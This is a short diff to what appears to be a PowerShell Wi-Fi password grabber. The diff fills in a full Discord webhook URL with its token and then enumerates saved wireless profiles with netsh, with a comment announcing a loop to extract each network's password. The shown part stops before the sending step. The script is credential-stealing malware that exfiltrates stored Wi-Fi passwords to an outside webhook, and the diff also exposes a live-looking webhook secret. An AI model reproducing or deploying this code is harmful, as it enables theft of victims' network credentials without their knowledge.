@@ -1,5 +1,5 @@
 ﻿#Insert your webhook here
-$webhookUri = 'XXXXXXXXXXXXX'
+$webhookUri = 'https://discord.com/api/webhooks/1321562861125898250/VEn70zL8V1yBmMAg_ou8azhw-_snptoXqtyQLfKtgcvQxhCd_hewjp4gCAHk4oFmwYZa'
 #Get List of SSIDS
 $SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
 #A loop to get password for each SSID
